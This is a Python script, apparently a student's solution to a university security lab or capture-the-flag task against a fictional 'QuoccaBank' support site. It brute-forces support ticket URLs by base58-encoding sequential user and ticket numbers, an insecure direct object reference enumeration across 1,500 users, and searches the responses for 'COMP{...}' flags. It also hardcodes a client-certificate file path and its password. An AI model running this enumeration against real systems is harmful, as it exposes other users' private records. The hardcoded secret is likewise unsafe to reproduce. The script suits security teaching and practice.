from requests_pkcs12 import get
import re
import base58

login_url = 'https://support.quoccabank.com/raw/'
p12_path = '/Users/bryanle/Downloads/z5361001.p12'
p12_password = 'Qs3/Keg5W3D/kSJJfp9ltw=='

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://support.quoccabank.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://support.quoccabank.com/new',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
}

interesting_things = []
flag_match = re.compile("COMP{.+}")

user_number = 1
ticket_number = 1
max_user_number = 1500

while user_number <= max_user_number:
    ticket_exists = True
    ticket_number = 1
    while ticket_exists:
        encoded_ticket = base58.b58encode(f"{user_number}:{ticket_number}".encode()).decode()
        response = get(
            login_url + encoded_ticket,
            headers=headers,
            pkcs12_filename=p12_path,
            pkcs12_password=p12_password
        )
        if "Ticket not found" in response.text:
            ticket_exists = False
            print(f"User {user_number} Ticket {ticket_number} not found, moving to next user.")
        elif "support" in response.text:
            print("------------------------------------------------------------------------")
            print(f"User {user_number} Ticket {ticket_number} - Something interesting!!")
            print(response.text)
            print("------------------------------------------------------------------------")
            interesting_things.append(response.text)
        else:
            print(f"User {user_number} Ticket {ticket_number} - Nothing interesting")
            print(response.text)
        ticket_number += 1
    user_number += 1

print(f"Interesting things: {interesting_things}")
